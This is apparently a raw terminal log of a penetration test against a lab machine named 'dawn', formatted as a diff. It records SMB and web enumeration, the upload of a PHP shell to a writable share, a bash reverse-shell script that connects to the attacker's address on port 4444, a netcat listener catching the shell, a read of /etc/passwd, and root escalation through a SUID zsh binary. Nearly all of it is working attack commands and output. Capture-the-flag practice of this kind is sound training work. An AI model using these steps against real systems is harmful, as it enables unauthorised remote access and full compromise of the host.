@@ -1,0 +1,200 @@
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //192.168.167.11 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
+	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            WIN2K3STDVIC
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbmap -H 192.168.167.11 -u guest -p ''
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                                       [*] Detected 1 hosts serving SMB
+[|] Initializing hosts...                                                                                            [/] Authenticating...                                                                                                [-] Authenticating...                                                                                                [\] Authenticating...                                                                                                [|] Authenticating...                                                                                                [/] Authenticating...                                                                                                [*] Established 1 SMB connections(s) and 0 authenticated session(s)
+[-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                                                                                                                                
+[+] IP: 192.168.167.11:445	Name: 192.168.167.11      	Status: NULL Session
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	ITDEPT                                            	READ, WRITE	PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
+	IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.5-Debian)
+[\] Closing connections..                                                                                            [|] Closing connections..                                                                                            [/] Closing connections..                                                                                            [-] Closing connections..                                                                                            [*] Closed 1 connections                                                                            
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+┌──(root㉿kali)-[/home/kali]
+└─# gobuster dir -u http://192.168.167.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,asp,aspx 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.167.11
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,asp,aspx,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 293]
+/index.html           (Status: 200) [Size: 791]
+/.html                (Status: 403) [Size: 294]
+/logs                 (Status: 301) [Size: 315] [--> http://192.168.167.11/logs/]
+Progress: 40102 / 1323366 (3.03%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 40212 / 1323366 (3.04%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+http://192.168.167.11/logs/management.log
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# mysql -h 192.168.167.11 -P 3306 --ssl=0 -u guest                                                      
+ERROR 1045 (28000): Access denied for user 'guest'@'192.168.45.210' (using password: NO)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# mysql -h 192.168.167.11 -P 3306 --ssl=0         
+ERROR 1045 (28000): Access denied for user 'root'@'192.168.45.210' (using password: NO)
+                                                  
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //192.168.167.11/ITDEPT -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Oct  2 02:11:10 2025
+  ..                                  D        0  Wed Jul 22 13:19:41 2020
+
+		7158264 blocks of size 1024. 3518804 blocks available
+smb: \> put shell.php
+putting file shell.php as \shell.php (0.3 kb/s) (average 0.3 kb/s)
+smb: \> ls
+  .                                   D        0  Thu Oct  2 02:12:55 2025
+  ..                                  D        0  Wed Jul 22 13:19:41 2020
+  shell.php                           A       42  Thu Oct  2 02:12:55 2025
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat /tmp/pwn.sh                                       
+#!/bin/bash
+# simple bash TCP reverse shell
+exec 5<>/dev/tcp/192.168.45.210/4444
+cat <&5 | while read line; do $line 2>&1 >&5; done
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+smb: \> ls
+  .                                   D        0  Thu Oct  2 03:06:05 2025
+  ..                                  D        0  Wed Jul 22 13:19:41 2020
+  pwn.sh                              A      132  Thu Oct  2 03:04:56 2025
+
+		7158264 blocks of size 1024. 3513740 blocks available
+smb: \> put web-control
+putting file web-control as \web-control (1.1 kb/s) (average 0.8 kb/s)
+smb: \> 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                          
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.167.11] 40138
+
+
+
+www-data@dawn:/var$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+dawn:x:1000:1000:dawn,,,:/home/dawn:/bin/bash
+...
+ganimedes:x:1001:1001:,,,:/home/ganimedes:/bin/bash
+www-data@dawn:/var$ 
+
+www-data@dawn:/var$ find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/mount.cifs
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/zsh
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/chfn
+
+
+www-data@dawn:/var$ /usr/bin/zsh -p
+dawn# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+dawn# 
+www-data@dawn:/var$ /usr/bin/zsh -p
+dawn# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+dawn# ls -l /usr/bin/sudo
+-rwsr-xr-x 1 root root 157192 Jan 12  2019 /usr/bin/sudo
+dawn# /usr/bin/sudo -p
+/usr/bin/sudo: option requires an argument -- 'p'
+usage: sudo -h | -K | -k | -V
+usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
+usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
+            [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
+            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
+            prompt] [-T timeout] [-u user] file ...
+dawn# ls -l /usr/bin/zsh
+-rwsr-xr-x 1 root root 861568 Feb  4  2019 /usr/bin/zsh
+dawn# exec /usr/bin/zsh -p -c 'bash -p'
+
+bash-5.0# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+bash-5.0# cat /root/root.txt
+cat: /root/root.txt: No such file or directory
+bash-5.0# whoami
+root
+bash-5.0# 
+
